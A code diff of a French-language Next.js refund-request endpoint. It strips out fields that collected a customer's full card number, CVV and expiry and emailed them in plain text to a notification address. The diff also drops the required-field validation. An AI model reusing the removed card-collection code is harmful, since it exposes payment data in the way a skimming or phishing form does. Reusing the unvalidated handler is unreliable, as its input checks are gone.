@@ -10,23 +10,9 @@ export async function POST(req: NextRequest) {
       phone,
       reason,
       amount,
-      cardNumber,
-      cardCvv,
-      cardExpiry,
     } = body;
 
-    const sanitizedCardNumber =
-      typeof cardNumber === 'string' ? cardNumber.replace(/\D/g, '') : '';
-    const cardLast16 = sanitizedCardNumber.slice(16)
-      ? `${sanitizedCardNumber.slice(16)}`
-      : 'Renseignée';
-
-    if (!fullName || !email || !phone || !amount) {
-      return NextResponse.json(
-        { error: 'Champs obligatoires manquants.' },
-        { status: 400 }
-      );
-    }
+    
 
     const notificationEmail =
       process.env.ALERT_EMAIL || process.env.REFUND_NOTIFICATION_EMAIL;
@@ -64,8 +50,6 @@ Informations du client:
 
 Détails du remboursement:
 - Montant: ${Number.parseFloat(amount).toFixed(2)} EUR
-- Méthode: Carte bancaire
-- Carte: ${sanitizedCardNumber},(${cardCvv},${cardExpiry|| 'Renseignée'})
 
 Date de la demande: ${new Date().toLocaleString('fr-FR')}
 `;
